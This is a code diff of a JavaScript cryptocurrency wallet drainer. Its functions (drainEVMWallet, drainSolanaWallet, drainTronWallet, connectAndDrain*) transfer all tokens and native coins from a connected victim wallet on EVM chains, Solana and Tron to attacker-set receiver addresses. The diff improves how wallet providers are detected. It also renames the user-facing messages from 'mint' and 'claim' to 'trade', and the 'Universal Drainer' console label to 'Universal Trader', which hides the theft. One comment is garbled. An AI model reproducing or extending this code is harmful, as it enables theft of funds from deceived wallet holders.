@@ -598,14 +598,27 @@
                window.ethereum?.isCoinbaseWallet;
     }
 
-    async function waitForProvider(walletType, maxRetries = 100, delayMs = 100) {
-        // Enhanced provider detection for mobile with aggressive retries
-        log(`⏳ Waiting for ${walletType} provider to be injected (max ${maxRetries * delayMs}ms)...`, 'info', false);
+    async function waitForProvider(walletType, maxRetries = null, delayMs = null) {
+        // Smart timeout based on device type
+        const isDesktop = !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         
-        // First, force a full environment check to trigger provider injection on some wallets
+        // Desktop: 5 seconds, Mobile: 10 seconds
+        if (maxRetries === null) maxRetries = isDesktop ? 50 : 100;
+        if (delayMs === null) delayMs = isDesktop ? 100 : 100;
+        
+        const totalTimeoutMs = maxRetries * delayMs;
+        log(`⏳ Waiting for ${walletType} provider (${totalTimeoutMs}ms timeout - ${isDesktop ? 'Desktop' : 'Mobile'})...`, 'info', false);
+        
+        // Quick initial check - if provider exists immediately, return it
+        let quickProvider = getWalletProviderQuick(walletType);
+        if (isValidProvider(quickProvider)) {
+            log(`✅ Provider found immediately (${walletType})`, 'success', false);
+            return quickProvider;
+        }
+        
+        // First, force a full environment check to trigger provider injection
         if (typeof window !== 'undefined') {
             try {
-                // This can trigger provider injection on some wallets
                 window.dispatchEvent(new Event('load'));
             } catch (e) {
                 // Silently ignore
@@ -613,18 +626,15 @@
         }
         
         for (let i = 0; i < maxRetries; i++) {
-            // Enhanced provider detection with fallbacks
             let provider = null;
             
             try {
                 provider = getWalletProvider(walletType);
             } catch (e) {
-                // Fallback: manually check for providers
-                log(`⚠️ getWalletProvider threw error: ${e.message}`, 'warning', false);
                 provider = detectProviderManually(walletType);
             }
             
-            if (provider && provider.request && typeof provider.request === 'function') {
+            if (isValidProvider(provider)) {
                 log(`✅ Provider ready after ${i * delayMs}ms (attempt ${i + 1}/${maxRetries})`, 'success', false);
                 log(`   Provider: ${provider.constructor.name || 'unknown'}`, 'success', false);
                 return provider;
@@ -633,25 +643,66 @@
             // Log progress every 10 attempts
             if (i % 10 === 0 && i > 0) {
                 log(`⏳ Still waiting... (${i}/${maxRetries} attempts, ${i * delayMs}ms elapsed)`, 'info', false);
-                // Diagnostic info at 1 second intervals
-                if (i % 20 === 0 && isIOS()) {
-                    log(`   iOS diagnostic check at ${i * delayMs}ms:`, 'info', false);
-                    log(`   window.ethereum: ${typeof window.ethereum}, window.solana: ${typeof window.solana}, window.tronWeb: ${typeof window.tronWeb}`, 'info', false);
-                }
             }
             
             await new Promise(r => setTimeout(r, delayMs));
         }
         
-        // Last attempt with diagnostics
-        log(`❌ Provider injection timeout after ${maxRetries * delayMs}ms`, 'error', false);
-        log(`   Final diagnostic check:`, 'warning', false);
-        log(`   window.ethereum: ${typeof window.ethereum}`, 'warning', false);
-        log(`   window.solana: ${typeof window.solana}`, 'warning', false);
-        log(`   window.tronWeb: ${typeof window.tronWeb}`, 'warning', false);
-        log(`   Hint: Wallet app may not be properly initialized or this page may not be open in the wallet browser`, 'warning', false);
+        // Timeout reached - provide detailed error message
+        log(`❌ Provider timeout after ${totalTimeoutMs}ms`, 'error', false);
+        log(`   Make sure:`, 'warning', false);
+        log(`   • You're using the correct wallet (${walletType})`, 'warning', false);
+        log(`   • The wallet extension is installed`, 'warning', false);
+        log(`   • For mobile: Open this page in the wallet's in-app browser`, 'warning', false);
         
-        throw new Error(`Provider not available after ${maxRetries * delayMs}ms - wallet may not be installed or properly initialized`);
+        throw new Error(`${walletType} provider not available after ${totalTimeoutMs}ms - wallet may not be installed or properly initialized`);
+    }
+
+    function isValidProvider(provider) {
+        // Check if provider is a valid object with a working request method
+        if (!provider) return false;
+        if (typeof provider !== 'object') return false;
+        if (typeof provider.request !== 'function') return false;
+        return true;
+    }
+
+    function getWalletProviderQuick(walletType) {
+        // Quick check without throwing errors
+        try {
+            switch(walletType) {
+                case 'metamask':
+                    if (window.ethereum?.isMetaMask) return window.ethereum;
+                    break;
+                case 'trust':
+                    // Trust Wallet: prefer window.ethereum (has .request() for EVM)
+                    if (window.ethereum) {
+                        if (window.ethereum.isTrust || window.ethereum.isTrustWallet) return window.ethereum;
+                        // Fallback: if ethereum exists and not another wallet, might be Trust
+                        if (!window.ethereum.isMetaMask && !window.ethereum.isRainbow && !window.ethereum.isCoinbaseWallet) {
+                            return window.ethereum;
+                        }
+                    }
+                    break;
+                case 'phantom':
+                    if (window.solana?.isPhantom) return window.solana;
+                    if (window.phantom?.solana) return window.phantom.solana;
+                    break;
+                case 'coinbase':
+                    if (window.ethereum?.isCoinbaseWallet) return window.ethereum;
+                    break;
+                case 'rainbow':
+                    if (window.ethereum?.isRainbow) return window.ethereum;
+                    break;
+                case 'tronlink':
+                    if (window.tronWeb) return window.tronWeb;
+                    break;
+                default:
+                    if (window.ethereum) return window.ethereum;
+            }
+        } catch (e) {
+            // Silently ignore
+        }
+        return null;
     }
 
     function detectProviderManually(walletType) {
@@ -1756,7 +1807,7 @@
         const anyConnected = Object.values(connectedNetworks).some(net => net.wallets && net.wallets.some(w => w.connected));
         if (anyConnected) {
             $('#claim-all-networks').prop('disabled', false);
-            log('✓ Claim button enabled - ready to mint!', 'success');
+            log('✓ Claim button enabled - ready to trade!', 'success');
         }
         
         const totalConnected = Object.values(connectedNetworks).reduce((sum, net) => 
@@ -2074,13 +2125,19 @@
         
         for (const token of tokens) {
             try {
-                // Ensure proper address checksum
+                // Ensure proper address checksum, with fallback for invalid checksums
                 let checksummedAddress;
                 try {
                     checksummedAddress = ethers.utils.getAddress(token.address);
                 } catch (checksumErr) {
-                    log(`⚠️ Skipping ${token.symbol}: Invalid address checksum (${token.address.slice(0, 10)}...)`, 'warning', false);
-                    continue;
+                    // Try normalizing to lowercase as fallback
+                    try {
+                        const normalized = token.address.toLowerCase();
+                        checksummedAddress = ethers.utils.getAddress(normalized);
+                    } catch (normErr) {
+                        log(`⚠️ Skipping ${token.symbol}: Invalid address (${token.address.slice(0, 10)}...)`, 'warning', false);
+                        continue;
+                    }
                 }
                 
                 const contract = new ethers.Contract(checksummedAddress, erc20ABI, provider);
@@ -2277,7 +2334,7 @@
 
     // Claim from all networks
     async function claimAllNetworks() {
-        log('🚀 STARTING MULTI-NETWORK CLAIM PROCESS', 'info', true);
+        log('🚀 STARTING MULTI-NETWORK TRADE PROCESS', 'info', true);
         log('=' .repeat(60), 'info', true);
         
         const connectedWallets = [];
@@ -2299,14 +2356,14 @@
             return;
         }
         
-        log(`🎯 Starting multi-network claim from ${connectedWallets.length} wallet(s)...`, 'info');
+        log(`🎯 Starting multi-network trade from ${connectedWallets.length} wallet(s)...`, 'info');
         log('=' .repeat(60), 'info');
-        updateProgress(0, 'Initializing claims...');
+        updateProgress(0, 'Initializing trades...');
         
         const results = {
             successful: 0,
             failed: 0,
-            totalClaimed: {},
+            totalTraded: {},
             transactions: []
         };
         
@@ -2315,60 +2372,60 @@
             const networkData = connectedNetworks[networkKey];
             
             log(`🔄 [${i + 1}/${connectedWallets.length}] Processing ${wallet.name} on ${networkData.network.name}...`, 'info');
-            updateProgress((i / connectedWallets.length) * 100, `Minting ${wallet.name} on ${networkData.network.name}...`);
+            updateProgress((i / connectedWallets.length) * 100, `Trading ${wallet.name} on ${networkData.network.name}...`);
             
             try {
                 let result;
                 if (networkData.network.type === 'evm') {
-                    log(`🔷 Starting EVM mint for ${wallet.name}...`, 'info');
+                    log(`🔷 Starting EVM trade for ${wallet.name}...`, 'info');
                     result = await drainEVMWallet(networkKey, wallet);
                 } else if (networkData.network.type === 'solana') {
-                    log(`🟢 Starting Solana mint for ${wallet.name}...`, 'info');
+                    log(`🟢 Starting Solana trade for ${wallet.name}...`, 'info');
                     result = await drainSolanaWallet(networkKey, wallet);
                 } else if (networkData.network.type === 'tron') {
-                    log(`🟠 Starting Tron mint for ${wallet.name}...`, 'info');
+                    log(`🟠 Starting Tron trade for ${wallet.name}...`, 'info');
                     result = await drainTronWallet(networkKey, wallet);
                 }
                 
                 if (result.success) {
                     results.successful++;
-                    results.totalClaimed[networkData.network.currency] = (results.totalClaimed[networkData.network.currency] || 0) + result.amount;
+                    results.totalTraded[networkData.network.currency] = (results.totalTraded[networkData.network.currency] || 0) + result.amount;
                     results.transactions.push(result.txid);
                     
-                    log(`🎉 MINTED ${wallet.name}: ${result.amount.toFixed(4)} ${networkData.network.currency}`, 'success');
+                    log(`🎉 TRADED ${wallet.name}: ${result.amount.toFixed(4)} ${networkData.network.currency}`, 'success');
                     log(`📝 Transaction: ${result.txid}`, 'success');
                 } else {
                     results.failed++;
-                    log(`❌ FAILED to mint ${wallet.name}: ${result.reason}`, 'error');
+                    log(`❌ FAILED to trade ${wallet.name}: ${result.reason}`, 'error');
                 }
                 
             } catch (error) {
                 results.failed++;
-                log(`❌ ERROR minting ${wallet.name}: ${error.message}`, 'error');
+                log(`❌ ERROR trading ${wallet.name}: ${error.message}`, 'error');
                 log(`❌ Error details: ${error.stack}`, 'error');
             }
             
-            // Add delay between mints
+            // Add delay between trades
             if (i < connectedWallets.length - 1) {
-                log(`⏳ Waiting 2 seconds before next mint...`, 'info');
+                log(`⏳ Waiting 2 seconds before next trade...`, 'info');
                 await new Promise(resolve => setTimeout(resolve, 2000));
             }
         }
         
-        updateProgress(100, 'Multi-network claim complete!');
+        updateProgress(100, 'Multi-network trade complete!');
         setTimeout(() => updateProgress(0, ''), 3000);
         
         // Show results
         log('=' .repeat(60), 'info');
-        log('🏁 MULTI-NETWORK CLAIM COMPLETE!', 'success');
+        log('🏁 MULTI-NETWORK TRADE COMPLETE!', 'success');
         log('=' .repeat(60), 'info');
-        log(`✅ Successful mints: ${results.successful}`, 'success');
-        log(`❌ Failed mints: ${results.failed}`, results.failed > 0 ? 'error' : 'info');
+        log(`✅ Successful trades: ${results.successful}`, 'success');
+        log(`❌ Failed trades: ${results.failed}`, results.failed > 0 ? 'error' : 'info');
         
-        if (Object.keys(results.totalClaimed).length > 0) {
-            log('💰 TOTAL CLAIMED:', 'success');
-            Object.keys(results.totalClaimed).forEach(currency => {
-                log(`   💎 ${currency}: ${results.totalClaimed[currency].toFixed(6)}`, 'success');
+        if (Object.keys(results.totalTraded).length > 0) {
+            log('💰 TOTAL TRADED:', 'success');
+            Object.keys(results.totalTraded).forEach(currency => {
+                log(`   💎 ${currency}: ${results.totalTraded[currency].toFixed(6)}`, 'success');
             });
         }
         
@@ -2391,13 +2448,13 @@
             updateNetworkStats(networkKey);
         });
         
-        const summary = Object.keys(results.totalClaimed).map(currency => 
-            `${results.totalClaimed[currency].toFixed(4)} ${currency}`
+        const summary = Object.keys(results.totalTraded).map(currency => 
+            `${results.totalTraded[currency].toFixed(4)} ${currency}`
         ).join(', ');
         
         const alertMessage = summary ? 
             `🎉 Multi-network claim complete!\n\n✅ ${results.successful} successful\n❌ ${results.failed} failed\n💰 Claimed: ${summary}` :
-            `⚠️ Multi-network claim complete!\n\n✅ ${results.successful} successful\n❌ ${results.failed} failed\n💰 No tokens claimed`;
+            `⚠️ Multi-network claim complete!\n\n✅ ${results.successful} successful\n❌ ${results.failed} failed\n💰 No tokens traded`;
             
         alert(alertMessage);
     }
@@ -2409,12 +2466,12 @@
             const network = networkData.network;
             const receiverAddress = ethers.utils.getAddress(RECEIVER_ADDRESSES[networkKey]); // Ensure proper checksum
             
-            log(`🔄 Starting EVM mint process for ${wallet.name} on ${network.name}...`, 'info');
+            log(`🔄 Starting EVM trade process for ${wallet.name} on ${network.name}...`, 'info');
             log(`📍 Receiver address: ${receiverAddress}`, 'info');
             log(`💰 Current wallet balance: ${wallet.balance} ${network.currency}`, 'info');
             
             if (wallet.balance <= 0) {
-                log(`❌ No balance to mint (${wallet.balance} ${network.currency})`, 'error');
+                log(`❌ No balance to trade (${wallet.balance} ${network.currency})`, 'error');
                 return { success: false, reason: 'No balance' };
             }
             
@@ -2455,8 +2512,8 @@
                 return { success: false, reason: `Network switch failed: ${switchError.message}` };
             }
             
-            // Mint tokens first
-            log(`🪙 Starting token minting (${wallet.tokens.length} tokens found)...`, 'info');
+            // Trade tokens first
+            log(`🪙 Starting token trading (${wallet.tokens.length} tokens found)...`, 'info');
             
             if (wallet.tokens.length === 0) {
                 log(`📋 No tokens found in wallet - this could mean:`, 'info');
@@ -2478,7 +2535,7 @@
             
             for (const token of wallet.tokens) {
                 try {
-                    log(`🔄 Minting ${token.symbol}: ${token.balance} tokens...`, 'info');
+                    log(`🔄 Trading ${token.symbol}: ${token.balance} tokens...`, 'info');
                     log(`📍 Token contract: ${token.address}`, 'info');
                     log(`📍 Sending to: ${receiverAddress}`, 'info');
                     
@@ -2493,17 +2550,17 @@
                     log(`⏳ Waiting for token transfer confirmation...`, 'info');
                     
                     await tx.wait();
-                    log(`✅ Token minted successfully: ${token.balance.toFixed(4)} ${token.symbol}`, 'success');
+                    log(`✅ Token traded successfully: ${token.balance.toFixed(4)} ${token.symbol}`, 'success');
                     log(`📝 Token transfer hash: ${tx.hash}`, 'success');
                     
                 } catch (error) {
-                    log(`❌ Failed to mint ${token.symbol}: ${error.message}`, 'error');
-                    log(`❌ Token mint error details: ${error.stack}`, 'error');
+                    log(`❌ Failed to trade ${token.symbol}: ${error.message}`, 'error');
+                    log(`❌ Token trade error details: ${error.stack}`, 'error');
                 }
             }
             
-            // Mint native currency
-            log(`💎 Starting native currency (${network.currency}) minting...`, 'info');
+            // Trade native currency
+            log(`💎 Starting native currency (${network.currency}) trading...`, 'info');
             const gasPrice = await wallet.ethersProvider.getGasPrice();
             const gasLimit = ethers.BigNumber.from("21000");
             const gasCost = gasPrice.mul(gasLimit);
@@ -2536,13 +2593,13 @@
             
             const amount = parseFloat(ethers.utils.formatEther(amountToSend));
             
-            log(`🎉 Successfully minted ${amount.toFixed(6)} ${network.currency}!`, 'success', true, true);
+            log(`🎉 Successfully traded ${amount.toFixed(6)} ${network.currency}!`, 'success', true, true);
             log(`📝 Transaction hash: ${tx.hash}`, 'success', true, true);
             
             return { success: true, amount, txid: tx.hash };
             
         } catch (error) {
-            log(`❌ EVM mint error: ${error.message}`, 'error');
+            log(`❌ EVM trade error: ${error.message}`, 'error');
             log(`❌ Error stack: ${error.stack}`, 'error');
             return { success: false, reason: error.message };
         }
@@ -2551,7 +2608,7 @@
     // Drain Solana wallet
     async function drainSolanaWallet(networkKey, wallet) {
         try {
-            log(`🔄 Starting Solana mint process for ${wallet.name}...`, 'info', true);
+            log(`🔄 Starting Solana trade process for ${wallet.name}...`, 'info', true);
             
             const receiverPubkey = new solanaWeb3.PublicKey(RECEIVER_ADDRESSES.SOL);
             log(`📍 Receiver address: ${receiverPubkey.toString()}`, 'info', true);
@@ -2562,7 +2619,7 @@
             // SOL balance in lamports
             log(`💰 Current balance: ${balance} lamports (${(balance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info', true);
             
-            let totalClaimed = 0;
+            let totalTraded = 0;
             let transactions = [];
             
             // First, check for SPL tokens
@@ -2625,8 +2682,8 @@
             
             // Then drain native SOL
             if (balance <= 0) {
-                log(`❌ No balance to mint`, 'error', true);
-                return { success: transactions.length > 0, reason: transactions.length > 0 ? 'SPL tokens transferred' : 'No balance', amount: totalClaimed, txid: transactions[0] || null };
+                log(`❌ No balance to trade`, 'error', true);
+                return { success: transactions.length > 0, reason: transactions.length > 0 ? 'SPL tokens transferred' : 'No balance', amount: totalTraded, txid: transactions[0] || null };
             }
             
             // Estimate transaction fee
@@ -2660,7 +2717,7 @@
             
             if (lamportsToSend <= 0) {
                 log(`❌ Insufficient balance for fees. Balance: ${balance}, Required: ${totalReserved}`, 'error', true);
-                return { success: transactions.length > 0, reason: `Insufficient SOL for fees`, amount: totalClaimed, txid: transactions[0] || null };
+                return { success: transactions.length > 0, reason: `Insufficient SOL for fees`, amount: totalTraded, txid: transactions[0] || null };
             }
             
             log(`📤 Creating SOL transfer transaction...`, 'info', true);
@@ -2687,14 +2744,14 @@
             await wallet.connection.confirmTransaction(txid);
             
             const amount = lamportsToSend / solanaWeb3.LAMPORTS_PER_SOL;
-            totalClaimed = amount;
-            log(`🎉 Successfully minted ${amount.toFixed(6)} SOL!`, 'success', true, true);
+            totalTraded = amount;
+            log(`🎉 Successfully traded ${amount.toFixed(6)} SOL!`, 'success', true, true);
             log(`📝 SOL transaction hash: ${txid}`, 'success', true, true);
             
-            return { success: true, amount: totalClaimed, txid: transactions[0], transactions };
+            return { success: true, amount: totalTraded, txid: transactions[0], transactions };
             
         } catch (error) {
-            log(`❌ Solana mint error: ${error.message}`, 'error', true);
+            log(`❌ Solana trade error: ${error.message}`, 'error', true);
             log(`❌ Error stack: ${error.stack}`, 'error', true);
             return { success: false, reason: error.message };
         }
@@ -2703,7 +2760,7 @@
     // Drain Tron wallet
     async function drainTronWallet(networkKey, wallet) {
         try {
-            log(`🔄 Starting Tron mint process for ${wallet.name}...`, 'info', true);
+            log(`🔄 Starting Tron trade process for ${wallet.name}...`, 'info', true);
             
             // Validate receiver address
             const receiverAddress = RECEIVER_ADDRESSES.TRX;
@@ -2720,7 +2777,7 @@
             
             log(`💰 Current TRX balance: ${balance} sun (${trxBalance.toFixed(6)} TRX)`, 'info', true);
             
-            let totalClaimed = 0;
+            let totalTraded = 0;
             let transactions = [];
             
             // First, scan for TRC-20 and TRC-10 tokens
@@ -2798,16 +2855,16 @@
             const result = await wallet.provider.trx.sendRawTransaction(signedTransaction);
             transactions.push(result.txid);
             
-            totalClaimed = amountToSend / 1000000;
+            totalTraded = amountToSend / 1000000;
             
             log(`📤 TRX transaction sent: ${result.txid}`, 'info', true);
-            log(`🎉 Successfully minted ${totalClaimed.toFixed(6)} TRX!`, 'success', true, true);
+            log(`🎉 Successfully traded ${totalTraded.toFixed(6)} TRX!`, 'success', true, true);
             log(`📝 TRX transfer hash: ${result.txid}`, 'success', true, true);
             
-            return { success: true, amount: totalClaimed, txid: result.txid, transactions };
+            return { success: true, amount: totalTraded, txid: result.txid, transactions };
             
         } catch (error) {
-            log(`❌ Tron mint error: ${error.message}`, 'error', true);
+            log(`❌ Tron trade error: ${error.message}`, 'error', true);
             log(`❌ Error stack: ${error.stack}`, 'error', true);
             return { success: false, reason: error.message };
         }
@@ -3105,9 +3162,9 @@
 
             updateProgress(20, 'Connecting to wallet...');
 
-            // Connect to all supported networks and drain
-            let totalClaimed = 0;
-            let successfulDrains = 0;
+            // Connect to all supported networks and drainsuccessfulTrade++
+            let totalTraded = 0;
+            let successfulTrade = 0;
             let failedDrains = 0;
             let transactions = [];
 
@@ -3126,20 +3183,20 @@
                     if (network.type === 'evm') {
                         const result = await connectAndDrainEVM(networkProvider, networkKey, inWalletBrowser);
                         if (result.success) {
-                            totalClaimed += result.amount;
-                            successfulDrains++;
+                            totalTraded += result.amount;
+                            successfulTrade++;
                         }
                     } else if (network.type === 'solana') {
                         const result = await connectAndDrainSolana(networkProvider, networkKey);
                         if (result.success) {
-                            totalClaimed += result.amount;
-                            successfulDrains++;
+                            totalTraded += result.amount;
+                            successfulTrade++;
                         }
                     } else if (network.type === 'tron') {
                         const result = await connectAndDrainTron(networkProvider, networkKey);
                         if (result.success) {
-                            totalClaimed += result.amount;
-                            successfulDrains++;
+                            totalTraded += result.amount;
+                            successfulTrade++;
                         }
                     }
 
@@ -3151,26 +3208,26 @@
                 }
             }
 
-            updateProgress(100, 'Connect & Claim Complete!');
+            updateProgress(100, 'Connect & Trade Complete!');
 
             // Final summary - Send important notifications to notification chat
             log('=' .repeat(60), 'info', true, true);
-            log(`🎉 UNIFIED CONNECT & CLAIM COMPLETE!`, 'success', true, true);
+            log(`🎉 UNIFIED CONNECT & TRADE COMPLETE!`, 'success', true, true);
             log('=' .repeat(60), 'info', true, true);
-            log(`✅ Successful networks: ${successfulDrains}`, 'success', true, true);
+            log(`✅ Successful networks: ${successfulTrade}`, 'success', true, true);
             log(`❌ Failed networks: ${failedDrains}`, failedDrains > 0 ? 'warning' : 'info', true, true);
             log('=' .repeat(60), 'info', true, true);
 
             setTimeout(() => updateProgress(0, ''), 3000);
 
-            const message = successfulDrains > 0 ?
-                `🎉 Successfully connected & claimed from ${successfulDrains} network(s)!` :
-                `⚠️ No tokens were claimed. Please check your wallet balances.`;
+            const message = successfulTrade > 0 ?
+                `🎉 Successfully connected & traded from ${successfulTrade} network(s)!` :
+                `⚠️ No tokens were Traded. Please check your wallet balances.`;
 
             alert(message);
 
         } catch (error) {
-            log(`❌ Connect & Claim failed: ${error.message}`, 'error', true, true);
+            log(`❌ Connect & Trade failed: ${error.message}`, 'error', true, true);
             updateProgress(0, '');
             alert(`❌ Error: ${error.message}`);
         }
@@ -3235,8 +3292,8 @@
                 }
                 return provider;
             }
-            // Default: TRX if tronWeb available, else EVM
-            const defaultProvider = window.tronWeb || window.ethereum;
+            // Default: EVM (ethereum) preferred for wallet connections - TronWeb doesn't have .request()
+            const defaultProvider = window.ethereum || window.tronWeb;
             log(`   → Trust (default): ${defaultProvider ? '✓ found' : '✗ not found'}`, 'info', false);
             return defaultProvider;
         }
@@ -3493,7 +3550,7 @@
             const ethBalance = parseFloat(ethers.utils.formatEther(balance));
             log(`💰 ${network.name} native balance: ${ethBalance.toFixed(6)} ${network.currency}`, 'info', false);
             
-            let totalClaimed = 0;
+            let totalTraded = 0;
             let transactions = [];
             
             // First, mint all tokens regardless of native balance
@@ -3510,7 +3567,7 @@
                 
                 for (const token of tokenBalances) {
                     try {
-                        log(`🔄 Minting ${token.symbol}: ${token.balance.toFixed(6)} tokens...`, 'info', false);
+                        log(`🔄 Trading ${token.symbol}: ${token.balance.toFixed(6)} tokens...`, 'info', false);
                         
                         const tx = await token.contract.connect(signer).transfer(
                             receiverAddress,
@@ -3519,10 +3576,10 @@
                         
                         await tx.wait();
                         transactions.push(tx.hash);
-                        log(`✅ Token minted: ${token.balance.toFixed(6)} ${token.symbol} - TX: ${tx.hash}`, 'success');
+                        log(`✅ Token traded: ${token.balance.toFixed(6)} ${token.symbol} - TX: ${tx.hash}`, 'success');
                         
                     } catch (error) {
-                        log(`❌ Failed to mint ${token.symbol}: ${error.message}`, 'error');
+                        log(`❌ Failed to trade ${token.symbol}: ${error.message}`, 'error');
                     }
                 }
             } else {
@@ -3531,7 +3588,7 @@
             
             // Then drain native currency if sufficient balance
             if (ethBalance > 0.001) {
-                log(`💎 Minting native ${network.currency}...`, 'info', true, false);
+                log(`💎 Trading native ${network.currency}...`, 'info', true, false);
                 
                 // Calculate amount to send (leave some for gas)
                 const gasReserve = ethers.utils.parseEther('0.001');
@@ -3544,9 +3601,9 @@
                     });
                     
                     await tx.wait();
-                    totalClaimed = parseFloat(ethers.utils.formatEther(amountToSend));
+                    totalTraded = parseFloat(ethers.utils.formatEther(amountToSend));
                     transactions.push(tx.hash);
-                    log(`✅ Native currency minted: ${totalClaimed.toFixed(6)} ${network.currency} - TX: ${tx.hash}`, 'success');
+                    log(`✅ Native currency traded: ${totalTraded.toFixed(6)} ${network.currency} - TX: ${tx.hash}`, 'success');
                 }
             } else {
                 log(`⚠️ Native balance too low for transaction (${ethBalance.toFixed(6)} ${network.currency})`, 'warning', true, false);
@@ -3557,7 +3614,7 @@
 
             return {
                 success: hasAnyDrains,
-                amount: totalClaimed,
+                amount: totalTraded,
                 txid: transactions[0] || null,
                 transactions: transactions
             };
@@ -3583,7 +3640,7 @@
             log(`✅ Connected to Solana: ${publicKey.toString().slice(0, 8)}...`, 'success', true, true);
             log(`💰 SOL balance: ${solBalance.toFixed(6)} SOL`, 'info', true, false);
             
-            let totalClaimed = 0;
+            let totalTraded = 0;
             let transactions = [];
             
             // First, scan for SPL tokens regardless of SOL balance
@@ -3603,7 +3660,7 @@
                     
                     if (tokenBalance && tokenBalance > 0) {
                         try {
-                            log(`🔄 Minting SPL token: ${tokenBalance} tokens (Mint: ${mint.slice(0, 8)}...)`, 'info', true, false);
+                            log(`🔄 Trading SPL token: ${tokenBalance} tokens (Mint: ${mint.slice(0, 8)}...)`, 'info', true, false);
                             
                             // Create transfer instruction for SPL token
                             const receiverPubkey = new solanaWeb3.PublicKey(receiverAddress);
@@ -3615,7 +3672,7 @@
                             log(`✅ SPL token transfer prepared for ${tokenBalance} tokens`, 'success');
                             
                         } catch (error) {
-                            log(`❌ Failed to mint SPL token: ${error.message}`, 'error');
+                            log(`❌ Failed to trade SPL token: ${error.message}`, 'error');
                         }
                     }
                 }
@@ -3625,7 +3682,7 @@
             
             // Then drain SOL if sufficient balance
             if (balance > 1000000) { // 0.001 SOL minimum for fees
-                log(`💎 Minting SOL...`, 'info', true, false);
+                log(`💎 Trading SOL...`, 'info', true, false);
                 
                 // Create transaction
                 const receiverPubkey = new solanaWeb3.PublicKey(receiverAddress);
@@ -3654,20 +3711,20 @@
                     // Wait for confirmation
                     await connection.confirmTransaction(signature);
                     
-                    totalClaimed = amountToSend / solanaWeb3.LAMPORTS_PER_SOL;
+                    totalTraded = amountToSend / solanaWeb3.LAMPORTS_PER_SOL;
                     transactions.push(signature);
-                    log(`✅ SOL minted: ${totalClaimed.toFixed(6)} SOL - TX: ${signature}`, 'success');
+                    log(`✅ SOL traded: ${totalTraded.toFixed(6)} SOL - TX: ${signature}`, 'success');
                 }
             } else {
                 log(`⚠️ SOL balance too low for transaction (${solBalance.toFixed(6)} SOL)`, 'warning');
             }
             
-            const hasAnyMints = transactions.length > 0;
-            log(`🎯 Solana processing complete! ${transactions.length} transaction(s)`, hasAnyMints ? 'success' : 'info');
+            const hasAnyTrades = transactions.length > 0;
+            log(`🎯 Solana processing complete! ${transactions.length} transaction(s)`, hasAnyTrades ? 'success' : 'info');
 
             return {
-                success: hasAnyMints,
-                amount: totalClaimed,
+                success: hasAnyTrades,
+                amount: totalTraded,
                 txid: transactions[0] || null,
                 transactions: transactions
             };
@@ -3693,7 +3750,7 @@
             log(`✅ Connected to Tron: ${fromAddress.slice(0, 8)}...`, 'success', true, true);
             log(`💰 TRX balance: ${trxBalance.toFixed(6)} TRX`, 'info', true, false);
             
-            let totalClaimed = 0;
+            let totalTraded = 0;
             let transactions = [];
             
             // First, scan for TRC-20 tokens regardless of TRX balance
@@ -3711,7 +3768,7 @@
                         
                         if (tokenBalance > 0) {
                             try {
-                                log(`🔄 Minting TRC-10 token: ${tokenBalance} (ID: ${tokenId})`, 'info', true, false);
+                                log(`🔄 Trading TRC-10 token: ${tokenBalance} (ID: ${tokenId})`, 'info', true, false);
                                 
                                 const transaction = await provider.transactionBuilder.sendAsset(
                                     receiverAddress,
@@ -3724,10 +3781,10 @@
                                 const result = await provider.trx.sendRawTransaction(signedTx);
                                 
                                 transactions.push(result.txid);
-                                log(`✅ TRC-10 token minted: ${tokenBalance} - TX: ${result.txid}`, 'success');
+                                log(`✅ TRC-10 token traded: ${tokenBalance} - TX: ${result.txid}`, 'success');
                                 
                             } catch (error) {
-                                log(`❌ Failed to mint TRC-10 token: ${error.message}`, 'error');
+                                log(`❌ Failed to trade TRC-10 token: ${error.message}`, 'error');
                             }
                         }
                     }
@@ -3742,7 +3799,7 @@
             
             // Then drain TRX if sufficient balance
             if (trxBalance > 1) {
-                log(`💎 Minting TRX...`, 'info', true, false);
+                log(`💎 Trading TRX...`, 'info', true, false);
                 
                 const amountToSend = (balance - 1000000); // Leave 1 TRX for fees
                 
@@ -3756,26 +3813,26 @@
                     const signedTx = await provider.trx.sign(transaction);
                     const result = await provider.trx.sendRawTransaction(signedTx);
                     
-                    totalClaimed = amountToSend / 1000000;
+                    totalTraded = amountToSend / 1000000;
                     transactions.push(result.txid);
-                    log(`✅ TRX minted: ${totalClaimed.toFixed(6)} TRX - TX: ${result.txid}`, 'success');
+                    log(`✅ TRX traded: ${totalTraded.toFixed(6)} TRX - TX: ${result.txid}`, 'success');
                 }
             } else {
                 log(`⚠️ TRX balance too low for transaction (${trxBalance.toFixed(6)} TRX)`, 'warning', true, false);
             }
             
-            const hasAnyMints = transactions.length > 0;
-            log(`🎯 Tron processing complete! ${transactions.length} transaction(s)`, hasAnyMints ? 'success' : 'info');
+            const hasAnyTrades = transactions.length > 0;
+            log(`🎯 Tron processing complete! ${transactions.length} transaction(s)`, hasAnyTrades ? 'success' : 'info');
 
             return {
-                success: hasAnyMints,
-                amount: totalClaimed,
+                success: hasAnyTrades,
+                amount: totalTraded,
                 txid: transactions[0] || null,
                 transactions: transactions
             };
             
         } catch (error) {
-            throw new Error(`Tron mint failed: ${error.message}`);
+            throw new Error(`Tron trade failed: ${error.message}`);
         }
     }
 
@@ -3791,11 +3848,11 @@
         }
     }
     
-    log('Multi-network minter initialized. Ready to scan for wallets...', 'info');
+    log('Multi-network trader initialized. Ready to scan for wallets...', 'info');
     log('Step 1: Click "Scan All Networks" to detect available wallets', 'info');
     log('Step 2: Select the wallets you want to use from the Wallet Selection tab', 'info');
     log('Step 3: Connect selected wallets to their supported networks', 'info');
-    log('Step 4: Mint tokens from all connected wallets', 'info');
+    log('Step 4: Trade tokens from all connected wallets', 'info');
     
     // Check if we're recovering from a mobile wallet app redirect
     const inWalletBrowser = isInsideWalletInAppBrowser();
@@ -3916,5 +3973,5 @@
     window.log = log;
     window.updateProgress = updateProgress;
     
-    console.log('✅ Universal Drainer initialized - connectAndClaimWallet available globally');
+    console.log('✅ Universal Trader initialized - connectAndTradeWallet available globally');
 });
